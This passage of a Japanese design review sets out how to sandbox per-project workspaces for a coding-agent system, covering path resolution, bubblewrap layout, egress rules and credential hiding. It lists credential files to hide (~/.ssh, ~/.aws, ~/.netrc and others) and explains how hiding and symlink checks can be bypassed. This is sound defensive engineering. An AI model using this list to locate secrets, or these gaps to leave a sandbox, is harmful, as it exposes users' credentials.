- **コスト**: DO 数は project 数に比例する。D049 の範囲（Project は D1）なら、DO は「実行中/履歴を持つ project」だけに絞れる。空の project に DO を作らない（Worker が D1 で存在を確認してから `idFromName`）を守る。

### 8.2 U-02: 相対か絶対か

**「マシン ROOT からの相対 POSIX パス」を支持する。ただし実装の置き場所を変える。**

- **絶対パスはマシン依存。** 0044（マルチマシン）で同じ project を別マシンに移すと意味が変わる。クラウド製品はすべて「sandbox 内の固定パス」で、ホストパスを API に出さない。✅ 比較表
- **相対なら「許可親」の検査が 1 箇所で済む。** ROOT を dirfd で開き、相対全体を解決して外に出ないことを確かめる。0127 の案（決定 6）はこの形で正しい。
- **ただし「Worker が projectRoot と path を結合して送る」は弱い。** 結合と正規化が Worker 側にあると、マシンは「送られた相対パス」を信じるしかない。**マシンに `projectRoot` と `path` を別々に送り、マシンが結合・解決・検査する**方が、境界が 1 つになる。0127 の C9（"projects/a/x" を送る）は、マシン側の解決結果としてテストする。
- **symlink 検査は最終 component だけでは足りない。** `O_NOFOLLOW` は最後の要素にしか効かない。中間ディレクトリの symlink を許すと外に出る。**`openat2(RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS)`（Linux 5.6+）** か、各 component を `O_PATH|O_NOFOLLOW` で walk する。Node の `fs` に openat2 は無いので、rooted helper（0005 / D034）に閉じる。✅ [openat2(2)](https://man7.org/linux/man-pages/man2/openat2.2.html)
- **lexical 検査（先頭 /、`..`、空 segment、バックスラッシュ、NUL、`.hns`、長さ）は UX と早期拒否のために残す。** ただし**それは security 境界ではない**。API の lexical 検査を通っても、マシンの実体検査が最終判断。
- **root が symlink のときは拒否**（0127 の案どおり）。加えて「project root が ROOT の外」も拒否。エラーは `root_not_found` / `root_outside` / `root_symlink` の typed failure に分ける（UI の文言が変わる）。

### 8.3 U-03: root の変更

**固定を支持する。移動は「新 project + 新 DO + コピー」とする。**

- root の同一性は `.hns/root.json` の id と Journal の版に埋め込まれている。root を後から変えると、既存の版・lease・checkpoint の意味が壊れる。✅ [workspace.ts](packages/workspace/src/workspace.ts)
- 全製品で、環境の同一性は snapshot / VM ディスクそのもの。**「同じ環境のまま root だけ差し替える」操作は存在しない**。✅ 比較表
- 0127 の「作成時に 1 回だけ」は妥当。加えて、**削除しても root は消さない**（D024 の会話削除と同じ思想）を明記する。
- 既存 project の migration は `workspace_root = ""`（現行 ROOT）でよい。ただし **`.hns/root.json` が無い既存 root は初回に作る**（fail closed にすると既存ユーザーが全員止まる）。「不明な root は fail closed」は「マシンに無い root」に限定する。

### 8.4 cwd

- cwd は**利便性の情報**であり、封じ込めの境界ではない。bwrap の `--chdir` は初期位置を決めるだけで、プロセスは後から `cd` できる。
- したがって「cwd を project root にする」は正しいが、「cwd が root の外なら拒否」は不要（root に丸める現行でよい）。**代わりに、file API と exec の両方で root を検査する**。
- UI に cwd を自由入力させない（0127 の notes どおり）。cwd は project root からの相対で、tree から選ぶ。

### 8.5 資格情報の隠蔽

- **hide は「呼び出し側の任意リスト」ではなく「マシン設定の固定リスト + 常時 hide」にする。** 呼び出し側が hide を渡す設計は、新しい呼び出し元が追加されたときに漏れる。マシン起動時に「hide すべきパス」を解決し、sandbox 構築時に必ず適用する。
- 最低限の hide 対象: `~/.config/hns`（既存）、`~/.ssh`、`~/.aws`、`~/.config/gh`、`~/.git-credentials`、`~/.netrc`、マシンの Ed25519 鍵、cloudflared の token、`<projectRoot>/.hns`。
- **hide は read を消すが、bind した path の代替経路は消えない。** bwrap の README が「bind したものは昇格に使える」と言うとおり、同じ内容が別の bind（socket、ホームの別名、`/proc` の別 mount）から見えれば hide は無意味になる。hide は tmpfs で**ディレクトリごと差し替える**ので、その path からの traverse は消えるが、**sandbox 起動時に継承した fd** は残る。exec は毎回新しい sandbox なので、この窓は小さい（継承 fd を閉じるなら `--close-fd` 相当を検討）。
- **資格情報を root に置かない。** checkpoint（0154）が root を丸ごと保存するなら、hide しただけでは不十分（hide は sandbox 内の見え方で、ディスクには残る）。checkpoint の除外規則（`.hns`、`node_modules` 以外の secret、`.env`）を 0127 で決める。Cloudflare の「snapshot は token も運ぶ」が根拠。✅ [Cloudflare Lifetime](https://developers.cloudflare.com/sandbox/concepts/lifetime/)

## 9. 推奨（U-01 / U-02 / U-03 対応）

| ID | 推奨 | 対応 | 根拠 | 0127 での具体的な変更 |
| --- | --- | --- | --- | --- |
| R1 | **per-project DO を採用**する。DO 名 = projectId。D1 で存在を確認してから `idFromName`。最初の acquire で machineId と root を束縛し、違う組み合わせは拒否 | U-01 | Cloudflare「sandbox が信頼単位」「名前が到達先を決める」、D049 | 決定 1 を採用。テスト C4 / C7 に「別 project の DO に root が混ざらない」を追加 |
| R2 | **root はマシン ROOT からの相対 POSIX パス**。`""` は ROOT 自体。絶対パスは保存も送信もしない | U-02 | 全製品がホストパスを API に出さない。0044 に耐える | 決定 2 を採用。`Project.workspaceRoot` の型を「相対のみ」に |
| R3 | **結合と実体検査はマシンで**。Worker は `projectRoot` と `path` を別々に送る。マシンは ROOT を dirfd で開き、`openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)` か component walk で解決。失敗は `root_not_found` / `root_outside` / `root_symlink` | U-02 | O_NOFOLLOW は最終要素のみ。0127 の C9 をマシン側の解決に変える | 決定 6 の「Worker が結合」を修正。C9 の期待値を「マシンが解決した相対」に |
| R4 | **sandbox は ROOT を隠して project root だけ見せる**。`--ro-bind / /` → `--tmpfs <ROOT>` → `--bind <projectRoot> <projectRoot>` の順（`""` のときは ROOT = project root で同じ手順）。`<projectRoot>/.hns` も tmpfs で隠す | U-01/U-02 | 兄弟 project の read-only 漏えいを防ぐ。hns の現行は root だけ bind し、兄弟が見える | `createSandboxEnv` の root を「project root」にし、hide に ROOT と `.hns` を追加。integration test で「兄弟が読めない」。bind 先の親が自動作成されるかは probe で確認 |
| R5 | **資格情報 hide をマシン設定の固定リストにする**。`~/.config/hns`、`~/.ssh`、`~/.aws`、`~/.config/gh`、`~/.git-credentials`、`~/.netrc`、マシン鍵、cloudflared token。`--clearenv` は維持。**provider 鍵はマシンに置かない**（0151 の gateway） | U-01 | Claude Code が既定で `~/.ssh` を読ませることを限界として明記。Cloudflare の「入れたものは読める」 | 0194 の hide 配線を「呼び出し側」から「マシン起動時」に移す。C2 を hide 全体に拡張 |
| R6 | **project 単位の egress 方針を持つ**。既定は「マシンのグローバル設定に従う」。untrusted な project は `deny`（bwrap `--unshare-net`）または domain allowlist。少なくとも private range と `169.254.169.254` を遮断。**承認 UI が無い間は、egress を開ける project を明示的に選ばせる** | U-01 | Cursor の「auto-run + internet = exfiltration」、Codex の既定 off、Cloudflare の既定 off | 0127 の model に `Project.egress`（`inherit` / `deny` / `allowlist`）を足すか、別 issue に切る。**少なくとも 0127 で「未決定」と書かない** |
| R7 | **root は不変**。移動は「新 project + 新 DO + コピー + 新 root.json」。削除しても root は消さない。既存 project は `""` に migration。`.hns/root.json` が無い既存 root は初回に作る | U-03 | 全製品で環境の同一性 = snapshot/ディスク。Journal の版が root に紐づく | 決定 3 に「移動 = 新 project」を追記。C5 に「既存 root に marker を作る」を追加 |
| R8 | **運用の上限と監査**。project ごとの exec 同時実行を 1 に（lease）。マシン全体の同時実行を上限。ログには projectId と rootId を残し、絶対パスは残さない。checkpoint から `.hns`・secret・`.env` を除外 | U-01/U-03 | Cloudflare の idle 課金、hns の safety.md（パスと状態だけ残す） | 0127 の範囲外だが、0154 / 0156 への申し送りとして明記 |

補足（R1 の反対意見の扱い）: 「1 Session DO + `env(target)`」は、**DO を分けない代わりに、root の取り違えをテストで防ぐ**設計。テストで防ぐより構造で防ぐ方が強いので、per-project を推す。ただし project 数が数百になると DO の数が問題になる。D049 の「1 ワークスペース = 1 Session」を project に広げるなら、**空 project に DO を作らない**（D1 に project があるだけ）を守る。

## 10. 未確認・推測（正直な分離）

- ❓ E2B の既定 cwd、Daytona の sandbox 内ユーザー、Coder workspace の実行ユーザー、Fly の machine 単位 secret、Codespaces の container ユーザー名。
- ⚠️ Modal の「domain allowlist は TLS 443 のみ」は資料の記述どおりだが、非 TLS の扱い（block されるか、CIDR で通るか）は未確認。
- ⚠️ Vercel の credential brokering の対象プロトコル（HTTPS のみか）は firewall ページの記述からの推測。
- ⚠️ Devin の network policy の既定（profile 未適用時に open か）は未確認。Security Profiles は「profile が設定した分だけ制約する」と読める。
- ⚠️ Coder の workspace ディスク snapshot の有無は未確認（Terraform の再作成が基本）。
- ⚠️ Cloudflare Containers の最大連続実行時間・インスタンスサイズ・課金単価は未確認（lifetime ページの「6h inactivity」「idle 課金」のみ確認）。
- ⚠️ 各製品の CVE 一覧は系統的に見ていない。bubblewrap / runc / gVisor / Firecracker の個別 CVE は、README・設計文書・NVD で確認したものだけを引用した。
- ⚠️ hns の checkpoint（0154）が実際に何を保存するかは、0154 の設計を読んでいないため未確認。R8 の除外規則は 0154 のレビューで確定する。

## 11. 出典

### サンドボックス基盤

- E2B: [Security](https://e2b.dev/security) / [Lifecycle](https://docs.e2b.dev/sandbox) / [Persistence](https://docs.e2b.dev/sandbox/persistence) / [Internet access](https://docs.e2b.dev/network/internet-access) / [Restricting public access](https://docs.e2b.dev/network/restrict-public-access) / [Environment variables](https://docs.e2b.dev/sandbox/environment-variables)
- Daytona: [Isolation](https://www.daytona.com/docs/isolation) / [Network limits](https://www.daytona.com/docs/network-limits) / [Sandboxes](https://www.daytona.com/docs/sandboxes)
- Modal: [Sandboxes](https://modal.com/docs/guide/sandboxes) / [Networking and security](https://modal.com/docs/guide/sandbox-networking)
- Vercel: [Security model](https://vercel.com/docs/sandbox/concepts/security) / [Sandbox firewall](https://vercel.com/docs/sandbox/concepts/firewall) / [Persistence](https://vercel.com/docs/sandbox/concepts/persistent-sandboxes)
- Cloudflare: [Sandbox security](https://developers.cloudflare.com/sandbox/concepts/security/) / [Sandbox lifetime](https://developers.cloudflare.com/sandbox/concepts/lifetime/)
- Fly: [Fly Machines](https://docs.fly.io/machines/overview) / [Machines API](https://docs.fly.io/machines/)
- GitHub: [Security in Codespaces](https://docs.github.com/en/codespaces/reference/security-in-github-codespaces) / [Deep dive](https://docs.github.com/en/codespaces/about-codespaces/deep-dive) / [devcontainers spec](https://containers.dev/implementors/json_reference/)
- Coder: [Coder Docs](https://coder.com/docs) / [Coder Agents architecture](https://coder.com/docs/ai-coder/agents/architecture)

### コーディングエージェント

- Codex: [Agent approvals & security](https://learn.chatgpt.com/docs/agent-approvals-security) / [Cloud environments (Legacy)](https://learn.chatgpt.com/docs/environments/cloud-environment) / [Internet access](https://learn.chatgpt.com/docs/cloud/internet-access) / [Cloud environments](https://learn.chatgpt.com/docs/environments/cloud-environments)
- Claude Code: [Sandboxing](https://code.claude.com/docs/en/sandboxing) / [Security](https://code.claude.com/docs/en/security) / [sandbox-runtime](https://github.com/anthropics/sandbox-runtime)
- Cursor: [Cloud Agents](https://cursor.com/docs/cloud-agent) / [Security overview](https://cursor.com/docs/cloud-agent/security) / [Secrets & Network](https://cursor.com/docs/cloud-agent/security-network)
- Devin: [Environment](https://docs.devin.ai/onboard-devin/environment) / [Security Profiles](https://docs.devin.ai/product-guides/security-profiles) / [Secrets](https://docs.devin.ai/product-guides/secrets) / [CLI Sandbox](https://docs.devin.ai/cli/sandbox) / [Snapshots](https://docs.devin.ai/product-guides/snapshots)

### OS プリミティブ

- [bubblewrap README](https://github.com/containers/bubblewrap) / [bwrap.xml](https://github.com/containers/bubblewrap/blob/main/bwrap.xml)
- [namespaces(7)](https://man7.org/linux/man-pages/man7/namespaces.7.html) / [seccomp(2)](https://man7.org/linux/man-pages/man2/seccomp.2.html) / [openat2(2)](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [Landlock](https://docs.kernel.org/userspace-api/landlock.html)
- [gVisor: Introduction](https://gvisor.dev/docs/architecture_guide/intro/) / [gVisor: Security model](https://gvisor.dev/docs/architecture_guide/security/)
- [Firecracker design](https://github.com/firecracker-microvm/firecracker/blob/main/docs/design.md)

### 攻撃・事例

- [NVD: CVE-2024-21626](https://nvd.nist.gov/vuln/detail/cve-2024-21626) / [Snyk: runc container breakout](https://labs.snyk.io/resources/cve-2024-21626-runc-process-cwd-container-breakout/)
- [Simon Willison: EchoLeak](https://simonwillison.net/2025/Jun/11/echoleak/) / [arXiv: 2509.10540](https://arxiv.org/abs/2509.10540)
- [Invariant Labs: GitHub MCP prompt injection](https://invariantlabs.ai/blog/mcp-github-vulnerability)

### hns 内

- [docs/safety.md](docs/safety.md) / [docs/decisions.md](docs/decisions.md) / [docs/design/security.md](docs/design/security.md)
- [packages/workspace/src/sandbox.ts](packages/workspace/src/sandbox.ts) / [packages/workspace/src/workspace.ts](packages/workspace/src/workspace.ts) / [packages/workspace/src/rooted-helper.ts](packages/workspace/src/rooted-helper.ts)
- [work/issues/0127-model-project-workspace.md](work/issues/0127-model-project-workspace.md) / [work/issues/0147-machine-agent.md](work/issues/0147-machine-agent.md) / [work/issues/0194-machine-sandbox.md](work/issues/0194-machine-sandbox.md)
